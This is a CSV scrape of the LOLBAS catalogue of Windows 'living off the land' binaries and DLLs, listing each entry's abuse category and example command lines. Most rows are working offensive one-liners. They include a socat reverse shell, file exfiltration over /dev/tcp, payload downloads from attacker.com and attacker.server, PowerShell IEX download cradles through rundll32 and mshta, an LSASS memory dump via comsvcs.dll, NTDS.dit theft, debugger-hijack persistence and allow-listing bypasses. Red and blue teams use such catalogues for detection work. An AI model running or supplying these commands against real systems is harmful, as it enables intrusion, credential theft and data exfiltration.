Name,BInary_Link,Function,Code(s)
At.exe,https://lolbas-project.github.io/lolbas/Binaries/At/,[['Execute']],"['C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe']"
Atbroker.exe,https://lolbas-project.github.io/lolbas/Binaries/Atbroker/,[['Execute']],['ATBroker.exe /start malware']
Bash.exe,https://lolbas-project.github.io/lolbas/Binaries/Bash/,"[['Execute', 'AWL bypass']]","['bash.exe -c calc.exe', 'bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""', ""bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'"", 'bash.exe -c calc.exe']"
Bitsadmin.exe,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,"[['Alternate data streams', 'Download', 'Copy', 'Execute']]","['bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1', 'bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1', 'bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset', 'bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset']"
CertReq.exe,https://lolbas-project.github.io/lolbas/Binaries/Certreq/,"[['Download', 'Upload']]","['CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt', 'CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal']"
Certutil.exe,https://lolbas-project.github.io/lolbas/Binaries/Certutil/,"[['Download', 'Alternate data streams', 'Encode', 'Decode']]","['certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt', 'certutil -encode inputFileName encodedOutputFileName', 'certutil -decode encodedInputFileName decodedOutputFileName']"
Cmd.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,[['Alternate data streams']],"['cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat', 'cmd.exe - < fakefile.doc:payload.bat']"
Cmdkey.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/,[['Credentials']],['cmdkey /list']
Cmstp.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmstp/,"[['Execute', 'AWL bypass']]","['cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']"
Control.exe,https://lolbas-project.github.io/lolbas/Binaries/Control/,[['Alternate data streams']],['control.exe c:\\windows\\tasks\\file.txt:evil.dll']
Csc.exe,https://lolbas-project.github.io/lolbas/Binaries/Csc/,[['Compile']],"['csc.exe -out:My.exe File.cs', 'csc -target:library File.cs']"
Cscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Cscript/,[['Alternate data streams']],['cscript c:\\ads\\file.txt:script.vbs']
Desktopimgdownldr.exe,https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/,[['Download']],"['set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr']"
Dfsvc.exe,https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/,[['AWL bypass']],"['rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo']"
Diantz.exe,https://lolbas-project.github.io/lolbas/Binaries/Diantz/,"[['Alternate data streams', 'Download']]","['diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab', 'diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab']"
Diskshadow.exe,https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/,"[['Dump', 'Execute']]","['diskshadow.exe /s c:\\test\\diskshadow.txt', 'diskshadow> exec calc.exe']"
Dnscmd.exe,https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/,[['Execute']],['dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll']
Esentutl.exe,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/,"[['Copy', 'Alternate data streams', 'Download']]","['esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o', 'esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit', 'esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o', 'esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o', 'esentutl.exe /y \\\\192.168.100.100\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o', 'esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o']"
Eventvwr.exe,https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/,[['UAC bypass']],['eventvwr.exe']
Expand.exe,https://lolbas-project.github.io/lolbas/Binaries/Expand/,"[['Download', 'Copy', 'Alternate data streams']]","['expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat', 'expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat', 'expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat']"
,https://lolbas-project.github.io/lolbas/Binaries/Explorer/,[[]],[]
Extexport.exe,https://lolbas-project.github.io/lolbas/Binaries/Extexport/,[['Execute']],['Extexport.exe c:\\test foo bar']
Extrac32.exe,https://lolbas-project.github.io/lolbas/Binaries/Extrac32/,"[['Alternate data streams', 'Download', 'Copy']]","['extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe', 'extrac32 \\\\webdavserver\\webdav\\file.cab c:\\ADS\\file.txt:file.exe', 'extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt', 'extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe']"
Findstr.exe,https://lolbas-project.github.io/lolbas/Binaries/Findstr/,"[['Alternate data streams', 'Credentials', 'Download']]","['findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe', 'findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.txt:file.exe', 'findstr /S /I cpassword \\\\sysvol\\policies\\*.xml', 'findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe']"
Forfiles.exe,https://lolbas-project.github.io/lolbas/Binaries/Forfiles/,"[['Execute', 'Alternate data streams']]","['forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe', 'forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""']"
Ftp.exe,https://lolbas-project.github.io/lolbas/Binaries/Ftp/,"[['Execute', 'Download']]","['echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt', 'cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""']"
GfxDownloadWrapper.exe,https://lolbas-project.github.io/lolbas/Binaries/GfxDownloadWrapper/,[['Download']],"['C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""']"
Gpscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Gpscript/,[['Execute']],"['Gpscript /logon', 'Gpscript /startup']"
Hh.exe,https://lolbas-project.github.io/lolbas/Binaries/Hh/,"[['Download', 'Execute']]","['HH.exe http://some.url/script.ps1', 'HH.exe c:\\windows\\system32\\calc.exe']"
Ie4uinit.exe,https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/,[['Execute']],['ie4uinit.exe -BaseSettings']
Ieexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,"[['Download', 'Execute']]","['ieexec.exe http://x.x.x.x:8080/bypass.exe', 'ieexec.exe http://x.x.x.x:8080/bypass.exe']"
Ilasm.exe,https://lolbas-project.github.io/lolbas/Binaries/Ilasm/,[['Compile']],"['ilasm.exe C:\\public\\test.txt /exe', 'ilasm.exe C:\\public\\test.txt /dll']"
Infdefaultinstall.exe,https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/,[['Execute']],['InfDefaultInstall.exe Infdefaultinstall.inf']
Installutil.exe,https://lolbas-project.github.io/lolbas/Binaries/Installutil/,"[['AWL bypass', 'Execute']]","['InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll']"
Jsc.exe,https://lolbas-project.github.io/lolbas/Binaries/Jsc/,[['Compile']],"['jsc.exe scriptfile.js', 'jsc.exe /t:library Library.js']"
Makecab.exe,https://lolbas-project.github.io/lolbas/Binaries/Makecab/,"[['Alternate data streams', 'Download']]","['makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab', 'makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab', 'makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab']"
Mavinject.exe,https://lolbas-project.github.io/lolbas/Binaries/Mavinject/,"[['Execute', 'Alternate data streams']]","['MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll', 'Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""']"
Microsoft.Workflow.Compiler.exe,https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/,"[['Execute', 'AWL bypass']]","['Microsoft.Workflow.Compiler.exe tests.xml results.xml', 'Microsoft.Workflow.Compiler.exe tests.txt results.txt', 'Microsoft.Workflow.Compiler.exe tests.txt results.txt']"
Mmc.exe,https://lolbas-project.github.io/lolbas/Binaries/Mmc/,[['Execute']],['mmc.exe -Embedding c:\\path\\to\\test.msc']
MpCmdRun.exe,https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,"[['Download', 'Alternate data streams']]","['MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe', 'MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe']"
Msbuild.exe,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/,"[['AWL bypass', 'Execute']]","['msbuild.exe pshell.xml', 'msbuild.exe project.csproj']"
Msconfig.exe,https://lolbas-project.github.io/lolbas/Binaries/Msconfig/,[['Execute']],['Msconfig.exe -5']
Msdt.exe,https://lolbas-project.github.io/lolbas/Binaries/Msdt/,"[['Execute', 'AWL bypass']]","['msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE', 'msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE']"
Mshta.exe,https://lolbas-project.github.io/lolbas/Binaries/Mshta/,"[['Execute', 'Alternate data streams']]","['mshta.exe evilfile.hta', 'mshta.exe vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))', 'mshta.exe javascript:a=GetObject(""script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct"").Exec();close();', 'mshta.exe ""C:\\ads\\file.txt:file.hta""']"
Msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,[['Execute']],"['msiexec /quiet /i cmd.msi', 'msiexec /q /i http://192.168.100.3/tmp/cmd.png', 'msiexec /y ""C:\\folder\\evil.dll""', 'msiexec /z ""C:\\folder\\evil.dll""']"
Netsh.exe,https://lolbas-project.github.io/lolbas/Binaries/Netsh/,[['Execute']],['netsh.exe add helper C:\\Users\\User\\file.dll']
Odbcconf.exe,https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/,[['Execute']],"['odbcconf -f file.rsp', 'odbcconf /a {REGSVR c:\\test\\test.dll}']"
Pcalua.exe,https://lolbas-project.github.io/lolbas/Binaries/Pcalua/,[['Execute']],"['pcalua.exe -a calc.exe', 'pcalua.exe -a \\\\server\\payload.dll', 'pcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java']"
Pcwrun.exe,https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/,[['Execute']],['Pcwrun.exe c:\\temp\\beacon.exe']
Pktmon.exe,https://lolbas-project.github.io/lolbas/Binaries/Pktmon/,[['Reconnaissance']],"['pktmon.exe start --etw', 'pktmon.exe filter add -p 445']"
Presentationhost.exe,https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/,[['Execute']],['Presentationhost.exe C:\\temp\\Evil.xbap']
Print.exe,https://lolbas-project.github.io/lolbas/Binaries/Print/,"[['Alternate data streams', 'Copy']]","['print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe', 'print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe', 'print /D:C:\\OutFolder\\outfile.exe \\\\WebDavServer\\Folder\\File.exe']"
Psr.exe,https://lolbas-project.github.io/lolbas/Binaries/Psr/,[['Reconnaissance']],['psr.exe /start /output D:\\test.zip /sc 1 /gui 0']
Rasautou.exe,https://lolbas-project.github.io/lolbas/Binaries/Rasautou/,[['Execute']],['rasautou -d powershell.dll -p powershell -a a -e e']
Reg.exe,https://lolbas-project.github.io/lolbas/Binaries/Reg/,[['Alternate data streams']],['reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg']
Regasm.exe,https://lolbas-project.github.io/lolbas/Binaries/Regasm/,"[['AWL bypass', 'Execute']]","['regasm.exe AllTheThingsx64.dll', 'regasm.exe /U AllTheThingsx64.dll']"
Regedit.exe,https://lolbas-project.github.io/lolbas/Binaries/Regedit/,[['Alternate data streams']],"['regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey', 'regedit C:\\ads\\file.txt:regfile.reg']"
Regini.exe,https://lolbas-project.github.io/lolbas/Binaries/Regini/,[['Alternate data streams']],['regini.exe newfile.txt:hidden.ini']
Register-cimprovider.exe,https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/,[['Execute']],"['Register-cimprovider -path ""C:\\folder\\evil.dll""']"
Regsvcs.exe,https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/,"[['Execute', 'AWL bypass']]","['regsvcs.exe AllTheThingsx64.dll', 'regsvcs.exe AllTheThingsx64.dll']"
Regsvr32.exe,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,"[['AWL bypass', 'Execute']]","['regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll', 'regsvr32.exe /s /u /i:file.sct scrobj.dll', 'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll', 'regsvr32.exe /s /u /i:file.sct scrobj.dll']"
Replace.exe,https://lolbas-project.github.io/lolbas/Binaries/Replace/,"[['Copy', 'Download']]","['replace.exe C:\\Source\\File.cab C:\\Destination /A', 'replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A']"
Rpcping.exe,https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,[['Credentials']],['rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM']
Rundll32.exe,https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,"[['Execute', 'Alternate data streams']]","['rundll32.exe AllTheThingsx64,EntryPoint', 'rundll32.exe \\\\10.10.10.10\\share\\payload.dll,EntryPoint', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(\'http://ip:port/\');""', 'rundll32.exe javascript:""\\..\\mshtml.dll,RunHTMLApplication "";eval(""w=new%20ActiveXObject(\\""WScript.Shell\\"");w.run(\\""calc\\"");window.close()"");', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").run(""calc.exe"",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c taskkill /f /im rundll32.exe"",0,true);}', 'rundll32.exe javascript:""\\..\\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")', 'rundll32.exe -sta {CLSID}', 'rundll32 ""C:\\ads\\file.txt:ADSDLL.dll"",DllMain']"
Runonce.exe,https://lolbas-project.github.io/lolbas/Binaries/Runonce/,[['Execute']],['Runonce.exe /AlternateShellStartup']
Runscripthelper.exe,https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/,[['Execute']],['runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test']
Sc.exe,https://lolbas-project.github.io/lolbas/Binaries/Sc/,[['Alternate data streams']],"['sc create evilservice binPath=""\\""c:\\\\ADS\\\\file.txt:cmd.exe\\"" /c echo works > \\""c:\\ADS\\works.txt\\"""" DisplayName= ""evilservice"" start= auto\\ & sc start evilservice']"
Schtasks.exe,https://lolbas-project.github.io/lolbas/Binaries/Schtasks/,[['Execute']],"['schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\\some\\directory\\revshell.exe']"
Scriptrunner.exe,https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/,[['Execute']],"['Scriptrunner.exe -appvscript calc.exe', 'ScriptRunner.exe -appvscript ""\\\\fileserver\\calc.cmd""']"
SyncAppvPublishingServer.exe,https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/,[['Execute']],"['SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""']"
Ttdinject.exe,https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/,[['Execute']],"['TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""', 'ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""C:/Windows/System32/calc.exe""']"
Tttracer.exe,https://lolbas-project.github.io/lolbas/Binaries/Tttracer/,"[['Execute', 'Dump']]","['tttracer.exe C:\\windows\\system32\\calc.exe', 'TTTracer.exe -dumpFull -attach pid']"
vbc.exe,https://lolbas-project.github.io/lolbas/Binaries/Vbc/,[['Compile']],"['vbc.exe /target:exe c:\\temp\\vbs\\run.vb', 'vbc -reference:Microsoft.VisualBasic.dll c:\\temp\\vbs\\run.vb']"
Verclsid.exe,https://lolbas-project.github.io/lolbas/Binaries/Verclsid/,[['Execute']],['verclsid.exe /S /C {CLSID}']
Wab.exe,https://lolbas-project.github.io/lolbas/Binaries/Wab/,[['Execute']],['wab.exe']
Wmic.exe,https://lolbas-project.github.io/lolbas/Binaries/Wmic/,"[['Alternate data streams', 'Execute']]","['wmic.exe process call create ""c:\\ads\\file.txt:program.exe""', 'wmic.exe process call create calc', 'wmic.exe process call create ""C:\\Windows\\system32\\reg.exe add \\""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\"" /v \\""Debugger\\"" /t REG_SZ /d \\""cmd.exe\\"" /f""', 'wmic.exe /node:""192.168.0.1"" process call create ""evil.exe""', 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt""', 'wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create ""cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit""', 'wmic.exe process get brief /format:""https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl""', 'wmic.exe process get brief /format:""\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl""']"
Wscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Wscript/,[['Alternate data streams']],"['wscript c:\\ads\\file.txt:script.vbs', 'echo GetObject(""script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js"") > %temp%\\test.txt:hi.js && wscript.exe %temp%\\test.txt:hi.js']"
Wsreset.exe,https://lolbas-project.github.io/lolbas/Binaries/Wsreset/,[['UAC bypass']],['wsreset.exe']
Xwizard.exe,https://lolbas-project.github.io/lolbas/Binaries/Xwizard/,[['Execute']],"['xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}', 'xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}']"
Advpack.dll,https://lolbas-project.github.io/lolbas/Libraries/Advpack/,"[['AWL bypass', 'Execute']]","['rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,', 'rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,,1,', 'rundll32.exe advpack.dll,RegisterOCX test.dll', 'rundll32.exe advpack.dll,RegisterOCX calc.exe', 'rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""']"
Comsvcs.dll,https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/,[['Dump']],"['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""']"
Ieadvpack.dll,https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/,"[['AWL bypass', 'Execute']]","['rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,', 'rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,,1,', 'rundll32.exe ieadvpack.dll,RegisterOCX test.dll', 'rundll32.exe ieadvpack.dll,RegisterOCX calc.exe', 'rundll32 ieadvpack.dll, RegisterOCX ""cmd.exe /c calc.exe""']"
Ieaframe.dll,https://lolbas-project.github.io/lolbas/Libraries/Ieframe/,[['Execute']],"['rundll32.exe ieframe.dll,OpenURL ""C:\\test\\calc.url""']"
Mshtml.dll,https://lolbas-project.github.io/lolbas/Libraries/Mshtml/,[['Execute']],"['rundll32.exe Mshtml.dll,PrintHTML ""C:\\temp\\calc.hta""']"
Pcwutl.dll,https://lolbas-project.github.io/lolbas/Libraries/Pcwutl/,[['Execute']],"['rundll32.exe pcwutl.dll,LaunchApplication calc.exe']"
Setupapi.dll,https://lolbas-project.github.io/lolbas/Libraries/Setupapi/,"[['AWL bypass', 'Execute']]","['rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf', 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf']"
Shdocvw.dll,https://lolbas-project.github.io/lolbas/Libraries/Shdocvw/,[['Execute']],"['rundll32.exe shdocvw.dll,OpenURL ""C:\\test\\calc.url""']"
Shell32.dll,https://lolbas-project.github.io/lolbas/Libraries/Shell32/,[['Execute']],"['rundll32.exe shell32.dll,Control_RunDLL payload.dll', 'rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe', 'rundll32 SHELL32.DLL,ShellExec_RunDLL ""cmd.exe"" ""/c echo hi""']"
Syssetup.dll,https://lolbas-project.github.io/lolbas/Libraries/Syssetup/,"[['AWL bypass', 'Execute']]","['rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf', 'rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf']"
Url.dll,https://lolbas-project.github.io/lolbas/Libraries/Url/,[['Execute']],"['rundll32.exe url.dll,OpenURL ""C:\\test\\calc.hta""', 'rundll32.exe url.dll,OpenURL ""C:\\test\\calc.url""', 'rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e', 'rundll32.exe url.dll,FileProtocolHandler calc.exe', 'rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e', 'rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta']"
Zipfldr.dll,https://lolbas-project.github.io/lolbas/Libraries/Zipfldr/,[['Execute']],"['rundll32.exe zipfldr.dll,RouteTheCall calc.exe', 'rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e']"
AgentExecutor.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Agentexecutor/,[['Execute']],"['AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0"" 0 1', 'AgentExecutor.exe -powershell ""c:\\temp\\malicious.ps1"" ""c:\\temp\\test.log"" ""c:\\temp\\test1.log"" ""c:\\temp\\test2.log"" 60000 ""C:\\temp\\"" 0 1']"
Appvlp.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/,[['Execute']],"['AppVLP.exe \\\\webdav\\calc.bat', 'AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute(\'calc.exe\',\'\', \'\', \'open\', 1)""', 'AppVLP.exe powershell.exe -c ""$e=New-Object -ComObject excel.application;$e.RegisterXLL(\'\\\\webdav\\xll_poc.xll\')""']"
Bginfo.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/,"[['Execute', 'AWL bypass']]","['bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt', 'bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\10.10.10.10\\webdav\\bginfo.exe bginfo.bgi /popup /nolicprompt', '\\\\live.sysinternals.com\\Tools\\bginfo.exe \\\\10.10.10.10\\webdav\\bginfo.bgi /popup /nolicprompt']"
Cdb.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Cdb/,[['Execute']],['cdb.exe -cf x64_calc.wds -o notepad.exe']
csi.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/,[['Execute']],['csi.exe file']
Devtoolslauncher.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/,[['Execute']],"['devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test', 'devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] ""argument here"" test']"
dnx.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dnx/,[['Execute']],['dnx.exe consoleapp']
Dotnet.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/,"[['AWL bypass', 'Execute']]","['dotnet.exe [PATH_TO_DLL]', 'dotnet.exe [PATH_TO_DLL]']"
Dxcap.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/,[['Execute']],['Dxcap.exe -c C:\\Windows\\System32\\notepad.exe']
Excel.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/,[['Download']],['Excel.exe http://192.168.1.10/TeamsAddinLoader.dll']
Mftrace.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mftrace/,[['Execute']],"['Mftrace.exe cmd.exe', 'Mftrace.exe powershell.exe']"
Msdeploy.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/,"[['Execute', 'AWL bypass']]","['msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""', 'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""']"
msxsl.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/,"[['Execute', 'AWL bypass']]","['msxsl.exe customers.xml script.xsl', 'msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml', 'msxsl.exe customers.xml script.xsl', 'msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml']"
